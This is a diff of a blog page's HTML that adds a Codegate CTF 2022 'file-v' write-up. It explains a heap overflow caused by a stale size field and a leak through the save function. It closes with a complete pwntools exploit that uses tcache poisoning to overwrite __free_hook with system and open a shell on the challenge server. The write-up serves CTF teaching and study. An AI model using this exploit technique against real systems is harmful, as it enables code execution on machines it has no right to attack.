id="wp-duotone-blue-orange"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.098039215686275 1"></fefuncr><fefuncg type="table" tablevalues="0 0.66274509803922"></fefuncg><fefuncb type="table" tablevalues="0.84705882352941 0.41960784313725"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>		<header class="site-header has-inline-mobile-toggle" id="masthead" aria-label="Site" itemtype="https://schema.org/WPHeader" itemscope>
 			<div class="inside-header grid-container">
 				<div class="site-branding">
@@ -86,64 +98,386 @@ img.emoji {
 			
 	<div class="content-area" id="primary">
 		<main class="site-main" id="main">
-					<header class="page-header" aria-label="Page">
 			
-			<h1 class="page-title">
-				<span class="vcard">rookie</span>			</h1>
-
-					</header>
-		<article id="post-101" class="post-101 post type-post status-publish format-standard hentry category-writeups" itemtype="https://schema.org/CreativeWork" itemscope>
+<article id="post-101" class="post-101 post type-post status-publish format-standard hentry category-writeups" itemtype="https://schema.org/CreativeWork" itemscope>
 	<div class="inside-article">
 					<header class="entry-header" aria-label="Content">
-				<h2 class="entry-title" itemprop="headline"><a href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/" rel="bookmark">Codegate CTF 2022 file-v writeup</a></h2>		<div class="entry-meta">
+				<h1 class="entry-title" itemprop="headline">Codegate CTF 2022 file-v writeup</h1>		<div class="entry-meta">
 			<span class="posted-on"><time class="entry-date published" datetime="2022-02-28T03:10:23+00:00" itemprop="datePublished">February 28, 2022</time></span> <span class="byline">by <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope><a class="url fn n" href="https://pwnblog.github.io/author/hopeless/" title="View all posts by rookie" rel="author" itemprop="url"><span class="author-name" itemprop="name">rookie</span></a></span></span> 		</div>
 					</header>
 			
-			<div class="entry-summary" itemprop="text">
-				<p>codegate ctf 2022 file-v writeup</p>
-			</div>
-
-				<footer class="entry-meta" aria-label="Entry meta">
-			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0143.592 27.907l12.349 26.791A16 16 0 00228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z"></path></svg></span><span class="screen-reader-text">Categories </span><a href="https://pwnblog.github.io/category/writeups/" rel="category tag">writeups</a></span> <span class="comments-link"><span class="gp-icon icon-comments"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M132.838 329.973a435.298 435.298 0 0016.769-9.004c13.363-7.574 26.587-16.142 37.419-25.507 7.544.597 15.27.925 23.098.925 54.905 0 105.634-15.311 143.285-41.28 23.728-16.365 43.115-37.692 54.155-62.645 54.739 22.205 91.498 63.272 91.498 110.286 0 42.186-29.558 79.498-75.09 102.828 23.46 49.216 75.09 101.709 75.09 101.709s-115.837-38.35-154.424-78.46c-9.956 1.12-20.297 1.758-30.793 1.758-88.727 0-162.927-43.071-181.007-100.61z"></path><path d="M383.371 132.502c0 70.603-82.961 127.787-185.216 127.787-10.496 0-20.837-.639-30.793-1.757-38.587 40.093-154.424 78.429-154.424 78.429s51.63-52.472 75.09-101.67c-45.532-23.321-75.09-60.619-75.09-102.79C12.938 61.9 95.9 4.716 198.155 4.716 300.41 4.715 383.37 61.9 383.37 132.502z"></path></svg></span><a href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#respond"><span class="dsq-postid" data-dsqidentifier="101 https://pwnblog.github.io/?p=101">Leave a comment</span></a></span> 		</footer>
-			</div>
-</article>
-<article id="post-80" class="post-80 post type-post status-publish format-standard hentry category-writeups" itemtype="https://schema.org/CreativeWork" itemscope>
-	<div class="inside-article">
-					<header class="entry-header" aria-label="Content">
-				<h2 class="entry-title" itemprop="headline"><a href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/" rel="bookmark">0CTF 2021 Quals &#8220;ioa&#8221; writeup</a></h2>		<div class="entry-meta">
-			<span class="posted-on"><time class="updated" datetime="2022-02-28T01:59:21+00:00" itemprop="dateModified">February 28, 2022</time><time class="entry-date published" datetime="2022-02-15T14:24:11+00:00" itemprop="datePublished">February 15, 2022</time></span> <span class="byline">by <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope><a class="url fn n" href="https://pwnblog.github.io/author/hopeless/" title="View all posts by rookie" rel="author" itemprop="url"><span class="author-name" itemprop="name">rookie</span></a></span></span> 		</div>
-					</header>
+		<div class="entry-content" itemprop="text">
 			
-			<div class="entry-summary" itemprop="text">
-				<p>sslvpn ioa writeup for 0ctf 2021 quals.</p>
-			</div>
+<h2 id="0x1-filesystem">0x1 Filesystem?</h2>
+
+
+
+<p>The reason I chose this challenge is because nobody is focusing this challenge in my team, so I took a glance at it.</p>
+
+
+
+<p>This program consists 2 parts, first is main process which handle all our input, and a backend process(child) that handles all data passed by main process.</p>
+
+
+
+<p>These two process communicate with a socket pair.</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  int fd[2]; // [rsp+0h] [rbp-18h] BYREF
+  unsigned __int64 v4; // [rsp+8h] [rbp-10h]
+
+  v4 = __readfsqword(0x28u);
+  *(_QWORD *)fd = -1LL;
+  banner();
+  initial();
+  if ( socketpair(1, 1, 0, fd) &gt;= 0 )
+  {
+    if ( fork() )
+      interface(fd[1]);
+    backend(fd[0]);
+  }
+  perror(&quot;socketpair&quot;);
+  exit(-1);
+}</code></pre></div>
+
+
+
+<p>The frontend process has following functions:</p>
+
+
+
+<ul>
+<li>Create new file</li>
+<li>Print files</li>
+<li>Select file (perform some operations on specific file)<ul>
+<li>Edit file name</li>
+<li>Edit file color</li>
+<li>Show file content</li>
+<li>Edit file content</li>
+<li>Save file changes</li>
+<li>Remove file</li>
+</ul>
+</li>
+</ul>
+
+
+
+<p>The backend process is simpler, accept specific operations from frontend process and store in memory:</p>
+
+
+
+<ul>
+<li>Print files</li>
+<li>Create new file</li>
+<li>Select file ( actually just return a plain file structure)</li>
+<li>Edit file ( actually just store file structure from frontend process)</li>
+<li>Delete file</li>
+</ul>
+
+
+
+<h2 id="0x2-bug">0x2 Bug?</h2>
+
+
+
+<p>At first I thought there&#8217;s a race condition bug because there&#8217;s a fork call, otherwise It doesn&#8217;t need to fork a new process.</p>
+
+
+
+<p>But let&#8217;s take a closer look at edit function in frontend.</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    __printf_chk(1LL, &quot;Enter content: &quot;);
+    v5 = gets(new_len);
+    v6 = ptr-&gt;total_bytes;
+    v7 = v5;
+    v8 = (file *)malloc(ptr-&gt;total_bytes - ptr-&gt;content_len + new_len);
+    memcpy(v8, ptr, v6);
+    v8-&gt;edit_time = time(0LL);
+    v9 = v8-&gt;filename_len;
+    v8-&gt;content_len = new_len;
+    memcpy(&v8-&gt;content[v9 + 1], v7, new_len);
+    free(ptr);
+    free(v7);</code></pre></div>
+
+
+
+<p><strong>The total_bytes isn&#8217;t updated!</strong></p>
+
+
+
+<p>How do we update this field? Let&#8217;s check edit name function.</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    __printf_chk(1LL, &quot;Enter filename: &quot;);
+    v5 = gets(v4);
+    v6 = strlen(v5);
+    v7 = ptr-&gt;content_len + v6 + 0x19;
+    v8 = (file *)calloc(v7, 1uLL);
+    v8-&gt;total_bytes = v7;
+    v8-&gt;create_time = ptr-&gt;create_time;
+    v9 = time(0LL);
+    LODWORD(v7) = ptr-&gt;content_len;
+    v8-&gt;edit_time = v9;
+    v10 = ptr-&gt;color;
+    v8-&gt;filename_len = v6;
+    v8-&gt;content_len = v7;
+    v8-&gt;color = v10;
+    memcpy(v8-&gt;content, v5, v6);
+    memcpy(&v8-&gt;content[v6 + 1], &ptr-&gt;content[ptr-&gt;filename_len + 1], (unsigned int)v7);
+    free(ptr);
+    free(v5);</code></pre></div>
+
+
+
+<p><strong>total_bytes is actually updated in edit name!</strong></p>
+
+
+
+<p>What if, we first edit content like 0x100 bytes, edit name(update total_bytes) and second time we edit this content 0x20 bytes?</p>
+
+
+
+<p>memcpy<em>(v8, ptr, v6);</em> v6 is actually old total_bytes, which means we will overflow v8!</p>
+
+
+
+<h2 id="0x3-how-to-leak">0x3 How to leak?</h2>
+
+
+
+<p>Seems there&#8217;s only a oob write bug in edit, and likely it will cause heap crash, so how to leak?</p>
+
+
+
+<p>Let&#8217;s checksec first:</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[+] checksec for &#39;/home/rookie/funnypwn/codegate/2022/filev/file-v&#39;
+Canary                        : ✓ 
+NX                            : ✓ 
+PIE                           : ✓ 
+Fortify                       : ✓ 
+RelRO                         : Full</code></pre></div>
+
+
+
+<p>Everything is on, hmmm.</p>
+
+
+
+<figure class="wp-block-image"><img src="https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg" alt="Meme Challenge Accepted wallpaper | Challenge accepted, Book challenge,  Challenges"></figure>
+
+
+
+<h2 id="0x4-save-to-rescue">0x4 Save to rescue</h2>
+
+
+
+<p>What if , we don&#8217;t update total_bytes?</p>
+
+
+
+<p>After we updating content_len in edit content, how about save the file struct directly without editing name?</p>
+
+
+
+<p>Let&#8217;s check frontend save function:</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code> bufa[0] = 0x401012703LL;
+  if ( send(fd, bufa, 8uLL, 0) &lt; 0 || send(fd, &n, 4uLL, 0) &lt; 0 || send(fd, filename, n, 0) &lt; 0 )
+    goto LABEL_13;
+  if ( (int)recv(fd, &v7, 4uLL, 0) &lt; 0 )
+    goto LABEL_14;
+  if ( v7 == 0xC00000BB )
+    goto LABEL_10;
+  if ( send(fd, a4, 4uLL, 0) &lt; 0 || send(fd, a4, (unsigned int)a4-&gt;total_bytes, 0) &lt; 0 )
+  {
+LABEL_13:
+    perror(&quot;send&quot;);
+    exit(-1);
+  }</code></pre></div>
+
+
+
+<p>As you can see, the saved bytes is actually determined by total_bytes!</p>
+
+
+
+<p>If we make content_len larger than total_bytes, we can leak heap data by show content!</p>
+
+
+
+<script id="asciicast-ZxOKuyjOW4SIpDrMIg4xsWO5U" src="https://asciinema.org/a/ZxOKuyjOW4SIpDrMIg4xsWO5U.js" async></script>
+
+
+
+<h2 id="0x5-exploit">0x5 Exploit</h2>
+
+
+
+<p>The exploit is very straightforward, just abusing tcache link list, we can write free_hook to system and get shell.</p>
+
+
+
+<p>My exploit is a bit complex because I forgot libc 2.27 doesn&#8217;t check tcache chunk size, my first thought is writing one gadget to malloc_hook, but I didn&#8217;t found a useable one gadget. After some frustration I suddenly remembered libc 2.27 doesn&#8217;t check size metadata which means we can write anywhere!</p>
+
+
+
+<p>Here is my full exploit code:</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *
+
+debug = 0
+# socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:&quot;env LD_PRELOAD=./libc-2.27.so ./file-v&quot;
+if debug:
+    os.system(&#39;pkill -9 file-v&#39;)
+    p = remote(&#39;127.0.0.1&#39;, 5555)
+    with open(&#39;/tmp/test.gdb&#39;, &#39;w&#39;) as f:
+        f.write(&#39;b *0x555555556AEA&#39;)
+    # run_in_new_terminal(&quot;gdb attach $(ps -C file-v -o pid|sed -n &#39;2p&#39;) -x /tmp/test.gdb&quot;)  # attach child
+    # e = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)
+    e = ELF(&#39;filev/libc-2.27.so&#39;)
+else:
+    p = remote(&#39;3.36.184.9&#39;, 5555)
+    e = ELF(&#39;filev/libc-2.27.so&#39;)
+
+
+def show_drive():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;a&#39;)
+    p.recvuntil(&#39;The number of files: &#39;)
+    count = int(p.recvuntil(&#39;\n&#39;))
+    files = []
+    if count:
+        for i in range(count):
+            p.recvuntil(f&#39;[{i}]:&#39;)
+            p.recvuntil(&#39; &#39;)
+            files.append(p.recvuntil(&#39;\x1B&#39;, drop=1))
+    return files
+
+
+def create(fn, l=None):
+    if not l:
+        l = len(fn)
+    p.sendlineafter(&#39;&gt; &#39;, &#39;c&#39;)
+    p.sendlineafter(&#39;:&#39;, str(l))
+    p.sendlineafter(&#39;:&#39;, fn)
+
+
+def select(fn):
+    p.sendlineafter(&#39;&gt; &#39;, &#39;b&#39;)
+    p.sendlineafter(&#39;:&#39;, fn)
+
+
+def edit_name(fn, l=None):
+    if not l:
+        l = len(fn)
+    p.sendlineafter(&#39;&gt; &#39;, &#39;1&#39;)
+    p.sendlineafter(&#39;:&#39;, str(l))
+    p.sendafter(&#39;:&#39;, fn)
+
+
+def show():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;3&#39;)
+    content = bytearray()
+    while True:
+        data = p.recvline_regex(r&#39;^\d+\s\|.+?\|&#39;, timeout=0.5)
+        if data:
+            for m in re.finditer(rb&#39;^\d+\s\|(.+?)\|&#39;, data, re.MULTILINE):
+                for hexbyte in m.group(1).strip().split(b&#39; &#39;):
+                    if hexbyte:
+                        content += bytearray([int(hexbyte.decode(), 16)])
+        else:
+            return content
+
+
+def edit(c, l=None):
+    if not l:
+        l = len(c)
+    p.sendlineafter(&#39;&gt; &#39;, &#39;4&#39;)
+    p.sendlineafter(&#39;:&#39;, str(l))
+    p.sendafter(&#39;:&#39;, c)
+
+
+def save():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;5&#39;)
+
+
+def rm():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;d&#39;)
+
+
+def back():
+    p.sendlineafter(&#39;&gt; &#39;, &#39;b&#39;)
+
+
+create(&#39;rookie&#39;)
+create(&#39;fuck&#39;)
+select(&#39;rookie&#39;)
+edit(&#39;a&#39; * 0x90)
+save()
+back()
+select(&#39;rookie&#39;)
+data = show()
+heap = u64(data[0x19:0x21])
+libc = u64(data[0x79:0x81])
+e.address = libc - e.symbols[&#39;_IO_2_1_stderr_&#39;]
+log.success(f&#39;heap: 0x{heap:x} libc: 0x{e.address:x}&#39;)
+back()
+select(&#39;fuck&#39;)
+
+edit(&#39;a&#39; * (0x88 - 0x1d))
+edit_name(&#39;f&#39; * 0x67)
+edit_name(&#39;fuck&#39;)
+edit(b&#39;x&#39; * 0x69 + p64(0x71) + p64(e.symbols[&#39;__free_hook&#39;] - 0x13))
+edit_name(&#39;fuck&#39;)
+edit(b&#39;b&#39; * 0x49 + p64(0x101) + b&#39;b&#39; * 0x18)
+edit_name(&#39;fuck&#39;)
+edit(&#39;c&#39; * 0x49)
+payload = b&#39;/bin/sh\x00&#39; + b&#39;b&#39; * 0xb + p64(e.symbols[&#39;system&#39;])
+payload = payload.ljust(0x67)
+edit(payload)
+p.interactive()
+</code></pre></div>
+
+
+
+<p></p>
+		</div>
 
 				<footer class="entry-meta" aria-label="Entry meta">
-			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0143.592 27.907l12.349 26.791A16 16 0 00228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z"></path></svg></span><span class="screen-reader-text">Categories </span><a href="https://pwnblog.github.io/category/writeups/" rel="category tag">writeups</a></span> <span class="comments-link"><span class="gp-icon icon-comments"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M132.838 329.973a435.298 435.298 0 0016.769-9.004c13.363-7.574 26.587-16.142 37.419-25.507 7.544.597 15.27.925 23.098.925 54.905 0 105.634-15.311 143.285-41.28 23.728-16.365 43.115-37.692 54.155-62.645 54.739 22.205 91.498 63.272 91.498 110.286 0 42.186-29.558 79.498-75.09 102.828 23.46 49.216 75.09 101.709 75.09 101.709s-115.837-38.35-154.424-78.46c-9.956 1.12-20.297 1.758-30.793 1.758-88.727 0-162.927-43.071-181.007-100.61z"></path><path d="M383.371 132.502c0 70.603-82.961 127.787-185.216 127.787-10.496 0-20.837-.639-30.793-1.757-38.587 40.093-154.424 78.429-154.424 78.429s51.63-52.472 75.09-101.67c-45.532-23.321-75.09-60.619-75.09-102.79C12.938 61.9 95.9 4.716 198.155 4.716 300.41 4.715 383.37 61.9 383.37 132.502z"></path></svg></span><a href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/#respond"><span class="dsq-postid" data-dsqidentifier="80 https://pwnblog.github.io/?p=80">Leave a comment</span></a></span> 		</footer>
+			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0143.592 27.907l12.349 26.791A16 16 0 00228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z"></path></svg></span><span class="screen-reader-text">Categories </span><a href="https://pwnblog.github.io/category/writeups/" rel="category tag">writeups</a></span> 		<nav id="nav-below" class="post-navigation" aria-label="Single Post">
+			<span class="screen-reader-text">Post navigation</span>
+
+			<div class="nav-previous">
+<span class="gp-icon icon-arrow-left"><svg viewbox="0 0 192 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M178.425 138.212c0 2.265-1.133 4.813-2.832 6.512L64.276 256.001l111.317 111.277c1.7 1.7 2.832 4.247 2.832 6.513 0 2.265-1.133 4.813-2.832 6.512L161.43 394.46c-1.7 1.7-4.249 2.832-6.514 2.832-2.266 0-4.816-1.133-6.515-2.832L16.407 262.514c-1.699-1.7-2.832-4.248-2.832-6.513 0-2.265 1.133-4.813 2.832-6.512l131.994-131.947c1.7-1.699 4.249-2.831 6.515-2.831 2.265 0 4.815 1.132 6.514 2.831l14.163 14.157c1.7 1.7 2.832 3.965 2.832 6.513z" fill-rule="nonzero"></path></svg></span><span class="prev" title="Previous"><a href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/" rel="prev">0CTF 2021 Quals &#8220;ioa&#8221; writeup</a></span>
+</div>		</nav>
+				</footer>
 			</div>
 </article>
-<article id="post-30" class="post-30 post type-post status-publish format-standard hentry category-writeups" itemtype="https://schema.org/CreativeWork" itemscope>
-	<div class="inside-article">
-					<header class="entry-header" aria-label="Content">
-				<h2 class="entry-title" itemprop="headline"><a href="https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/" rel="bookmark">Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</a></h2>		<div class="entry-meta">
-			<span class="posted-on"><time class="updated" datetime="2022-02-15T14:49:09+00:00" itemprop="dateModified">February 15, 2022</time><time class="entry-date published" datetime="2022-02-09T15:27:15+00:00" itemprop="datePublished">February 9, 2022</time></span> <span class="byline">by <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope><a class="url fn n" href="https://pwnblog.github.io/author/hopeless/" title="View all posts by rookie" rel="author" itemprop="url"><span class="author-name" itemprop="name">rookie</span></a></span></span> 		</div>
-					</header>
-			
-			<div class="entry-summary" itemprop="text">
-				<p>Interesting challenge with CSKY cpu and weird arch mcore in RWCTF 2022</p>
+
+			<div class="comments-area">
+				
+<div id="disqus_thread"></div>
 			</div>
 
-				<footer class="entry-meta" aria-label="Entry meta">
-			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewbox="0 0 512 512" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0143.592 27.907l12.349 26.791A16 16 0 00228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z"></path></svg></span><span class="screen-reader-text">Categories </span><a href="https://pwnblog.github.io/category/writeups/" rel="category tag">writeups</a></span> 		</footer>
-			</div>
-</article>
-		</main>
+					</main>
 	</div>
 
 	<div class="widget-area sidebar is-right-sidebar" id="right-sidebar">
 	<div class="inside-right-sidebar">
 		<aside id="block-3" class="widget inner-padding widget_block">
-<div class="wp-container-621c41405ee07 wp-block-group"><div class="wp-block-group__inner-container">
+<div class="wp-container-621c413e0eaaa wp-block-group"><div class="wp-block-group__inner-container">
 <h2 id="recent-posts">Recent Posts</h2>
 
 
@@ -154,7 +488,7 @@ img.emoji {
 </ul>
 </div></div>
 </aside><aside id="block-4" class="widget inner-padding widget_block">
-<div class="wp-container-621c41405feb1 wp-block-group"><div class="wp-block-group__inner-container">
+<div class="wp-container-621c413e100ef wp-block-group"><div class="wp-block-group__inner-container">
 <h2 id="post-categories">Post Categories</h2>
 
 
@@ -179,12 +513,16 @@ img.emoji {
 		</footer>
 		</div>
 
-<script id="generate-a11y">!function(){"use strict";if("querySelector"in document&&"addEventListener"in window){var e=document.body;e.addEventListener("mousedown",function(){e.classList.add("using-mouse")}),e.addEventListener("keydown",function(){e.classList.remove("using-mouse")})}}();</script><style>.wp-container-621c41405ee07 .alignleft { float: left; margin-right: 2em; }.wp-container-621c41405ee07 .alignright { float: right; margin-left: 2em; }</style>
-<style>.wp-container-621c41405feb1 .alignleft { float: left; margin-right: 2em; }.wp-container-621c41405feb1 .alignright { float: right; margin-left: 2em; }</style>
+<script id="generate-a11y">!function(){"use strict";if("querySelector"in document&&"addEventListener"in window){var e=document.body;e.addEventListener("mousedown",function(){e.classList.add("using-mouse")}),e.addEventListener("keydown",function(){e.classList.remove("using-mouse")})}}();</script><style>.wp-container-621c413e0eaaa .alignleft { float: left; margin-right: 2em; }.wp-container-621c413e0eaaa .alignright { float: right; margin-left: 2em; }</style>
+<style>.wp-container-621c413e100ef .alignleft { float: left; margin-right: 2em; }.wp-container-621c413e100ef .alignright { float: right; margin-left: 2em; }</style>
 <script id="disqus_count-js-extra">
 var countVars = {"disqusShortname":"pwnblog"};
 </script>
 <script src="https://pwnblog.github.io/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.22" id="disqus_count-js"></script>
+<script id="disqus_embed-js-extra">
+var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.22"},"disqusIdentifier":"101 https:\/\/pwnblog.github.io\/?p=101","disqusShortname":"pwnblog","disqusTitle":"Codegate CTF 2022 file-v writeup","disqusUrl":"https:\/\/pwnblog.github.io\/2022\/02\/28\/codegate-ctf-2022-file-v-writeup\/","postId":"101"};
+</script>
+<script src="https://pwnblog.github.io/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.22" id="disqus_embed-js"></script>
 <!--[if lte IE 11]>
 <script src='https://pwnblog.github.io/wp-content/themes/generatepress/assets/js/classList.min.js?ver=3.1.3' id='generate-classlist-js'></script>
 <![endif]-->
@@ -192,6 +530,7 @@ var countVars = {"disqusShortname":"pwnblog"};
 var generatepressMenu = {"toggleOpenedSubMenus":"1","openSubMenuLabel":"Open Sub-Menu","closeSubMenuLabel":"Close Sub-Menu"};
 </script>
 <script src="https://pwnblog.github.io/wp-content/themes/generatepress/assets/js/menu.min.js?ver=3.1.3" id="generate-menu-js"></script>
+<script src="https://pwnblog.github.io/wp-includes/js/comment-reply.min.js?ver=5.9.1" id="comment-reply-js"></script>
 <script src="https://pwnblog.github.io/wp-includes/js/clipboard.min.js?ver=5.9.1" id="clipboard-js"></script>
 <script src="https://pwnblog.github.io/wp-content/plugins/highlighting-code-block//assets/js/prism.js?ver=1.5.5" id="hcb-prism-js"></script>
 <script src="https://pwnblog.github.io/wp-content/plugins/highlighting-code-block//build/js/hcb_script.js?ver=1.5.5" id="hcb-script-js"></script>
